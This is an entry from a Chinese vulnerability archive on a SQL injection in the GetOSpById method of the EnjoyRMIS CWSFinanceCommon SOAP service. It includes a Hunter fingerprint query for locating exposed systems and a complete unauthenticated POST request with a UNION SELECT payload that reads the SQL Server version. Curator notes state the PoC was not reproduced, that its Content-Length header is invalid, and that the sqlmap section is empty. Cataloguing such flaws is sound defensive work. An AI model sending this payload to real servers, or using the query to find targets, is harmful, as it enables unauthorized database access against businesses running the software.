---
source: "wy876 漏洞文库"
title: "昂捷EnjoyRMIS CWSFinanceCommon GetOSpById SQL注入"
product: "昂捷EnjoyRMIS"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server固定多列UNION，版本未知"
prerequisites: "无Cookie请求，权限待核"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/zpzm4hme69hpf525"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%98%82%E6%8D%B7/EnjoyRMISGetOSpById%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
hunter: "web.body=\"CheckSilverlightInstalled\""
id: "vw-902b44cb9496fab6e34da4b0"
entity_id: "ve-902b44cb9496fab6e34da4b0"
schema_version: "1"
previous_fofa_unverified: "web.body="
---

# 昂捷EnjoyRMIS CWSFinanceCommon GetOSpById SQL注入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：昂捷EnjoyRMIS；CWSFinanceCommon GetOSpById SQL注入
- 版本、配置及部署条件：SQL Server固定多列UNION，版本未知
- 认证与权限前提：无Cookie请求，权限待核
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 路径是APS/CWSFinanceCommon.asmx不同于前述POS/cwsoa，不要因GetO命名并为同服务
- Content-Length为length非法，sqlmap小节空且无@@version响应
- 缺产品构建/修复/源码，RCE后果需条件化

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
EnjoyRMIS存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息甚至可控制服务器。

## 二、影响版本
+ EnjoyRMIS

## 三、资产测绘
+ hunter`web.body="CheckSilverlightInstalled"`
+ 特征


## 四、漏洞复现
```http
POST /EnjoyRMIS_WS/WS/APS/CWSFinanceCommon.asmx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/GetOSpById"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetOSpById xmlns="http://tempuri.org/">
      <sId>string' UNION SELECT NULL,NULL,NULL,NULL,(select @@version),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- YQmj</sId>
    </GetOSpById>
  </soap:Body>
</soap:Envelope> 
```

> 请求长度说明：原资料 Content-Length 为 length；保留原始标头；其数值未据实际请求体重新计算或验证。


sqlmap


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zpzm4hme69hpf525>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
